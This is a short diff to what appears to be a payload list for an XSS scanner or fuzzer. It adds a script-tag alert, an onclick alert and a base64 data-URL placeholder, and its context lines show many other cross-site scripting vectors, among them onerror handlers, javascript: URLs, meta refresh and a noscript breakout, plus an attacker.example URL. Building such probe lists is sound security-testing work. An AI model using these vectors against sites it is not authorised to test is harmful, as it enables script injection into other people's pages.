@@ -12,10 +12,12 @@ HTML_BODY = [
     "<video src=x onerror=alert('{marker}')>",
     "<math><mtext></math><img src=x onerror=alert('{marker}')>",
     "<table background=\"javascript:alert('{marker}')\">",
+    "<script>alert('{marker}')</script>",
     "</p><script>alert('{marker}')</script>",
     "<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">",
     "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{marker}')\">",
     "<div onmouseover=\"alert('{marker}')\">x</div>",
+    "<a href='#' onclick='alert(\"{marker}\")'>x</a>",
     "<body><img src=x onerror=alert('{marker}')></body>",
     "\n<img src=x onerror=alert('{marker}')>",
     "\n<script>alert('{marker}')</script>",
@@ -116,6 +118,8 @@ OBJECT_DATA = [
     "//attacker.example/{marker}",
     "data:text/html,<script>alert('{marker}')</script>",
     '"><script>alert(\'{marker}\')</script>',
+    # Sentinel for base64-encoded data URL — resolved dynamically in payload_gen.generate()
+    "__B64_DATA_URL__:{marker}",
 ]
 
 COMMENT = [
